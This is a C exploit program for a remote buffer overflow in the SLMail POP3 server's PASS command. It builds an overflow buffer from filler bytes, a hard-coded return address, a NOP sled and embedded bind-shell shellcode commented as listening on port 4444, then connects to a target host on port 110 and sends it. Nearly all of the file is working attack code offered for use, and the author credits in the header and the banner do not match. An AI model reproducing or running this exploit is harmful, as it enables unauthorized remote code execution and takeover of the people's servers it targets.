/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/
#define retadd "\x8f\x35\x4a\x5f"
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
 
// [*] bind 4444
unsigned char shellcode[] =
"\xdb\xda\xba\x98\x96\x47\x79\xd9\x74\x24\xf4\x5f\x33\xc9\xb1" 
"\x52\x31\x57\x17\x83\xc7\x04\x03\xcf\x85\xa5\x8c\x13\x41\xab"
"\x6f\xeb\x92\xcc\xe6\x0e\xa3\xcc\x9d\x5b\x94\xfc\xd6\x09\x19"
"\x76\xba\xb9\xaa\xfa\x13\xce\x1b\xb0\x45\xe1\x9c\xe9\xb6\x60"
"\x1f\xf0\xea\x42\x1e\x3b\xff\x83\x67\x26\xf2\xd1\x30\x2c\xa1"
"\xc5\x35\x78\x7a\x6e\x05\x6c\xfa\x93\xde\x8f\x2b\x02\x54\xd6"
"\xeb\xa5\xb9\x62\xa2\xbd\xde\x4f\x7c\x36\x14\x3b\x7f\x9e\x64"
"\xc4\x2c\xdf\x48\x37\x2c\x18\x6e\xa8\x5b\x50\x8c\x55\x5c\xa7"
"\xee\x81\xe9\x33\x48\x41\x49\x9f\x68\x86\x0c\x54\x66\x63\x5a"
"\x32\x6b\x72\x8f\x49\x97\xff\x2e\x9d\x11\xbb\x14\x39\x79\x1f"
"\x34\x18\x27\xce\x49\x7a\x88\xaf\xef\xf1\x25\xbb\x9d\x58\x22"
"\x08\xac\x62\xb2\x06\xa7\x11\x80\x89\x13\xbd\xa8\x42\xba\x3a"
"\xce\x78\x7a\xd4\x31\x83\x7b\xfd\xf5\xd7\x2b\x95\xdc\x57\xa0"
"\x65\xe0\x8d\x67\x35\x4e\x7e\xc8\xe5\x2e\x2e\xa0\xef\xa0\x11"
"\xd0\x10\x6b\x3a\x7b\xeb\xfc\x85\xd4\xf2\xc0\x6d\x27\xf4\x39"
"\xd5\xae\x12\x53\x39\xe7\x8d\xcc\xa0\xa2\x45\x6c\x2c\x79\x20"
"\xae\xa6\x8e\xd5\x61\x4f\xfa\xc5\x16\xbf\xb1\xb7\xb1\xc0\x6f"
"\xdf\x5e\x52\xf4\x1f\x28\x4f\xa3\x48\x7d\xa1\xba\x1c\x93\x98"
"\x14\x02\x6e\x7c\x5e\x86\xb5\xbd\x61\x07\x3b\xf9\x45\x17\x85"
"\x02\xc2\x43\x59\x55\x9c\x3d\x1f\x0f\x6e\x97\xc9\xfc\x38\x7f"
"\x8f\xce\xfa\xf9\x90\x1a\x8d\xe5\x21\xf3\xc8\x1a\x8d\x93\xdc"
"\x63\xf3\x03\x22\xbe\xb7\x34\x69\xe2\x9e\xdc\x34\x77\xa3\x80"
"\xc6\xa2\xe0\xbc\x44\x46\x99\x3a\x54\x23\x9c\x07\xd2\xd8\xec"
"\x18\xb7\xde\x43\x18\x92";
 
void exploit(int sock) {
    char out[1024];
    char *buffer = malloc(2969);
    memset(buffer, 0x00, 2969);
    char *off = malloc(2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(8);
    memset(nop, 0x90, 8);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);
    
    char userMsg[] = "USER username\r\n";
    char passMsg[] = "PASS ";
    char crgMsg[] = "\r\n";
 
    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    recv(sock, out, 1024, 0);
    printf("[*] %s", out);
    send(sock, userMsg, 15, 0);
    recv(sock, out, 1024, 0);
    printf("[*] %s", out);
    send(sock, passMsg, 5, 0);
    send(sock, buffer, strlen(buffer), 0);
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    send(sock, crgMsg, 4, 0);
    close(sock); 
}
 
int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;
 
    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));
 
    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);
 
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}
 
 
int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
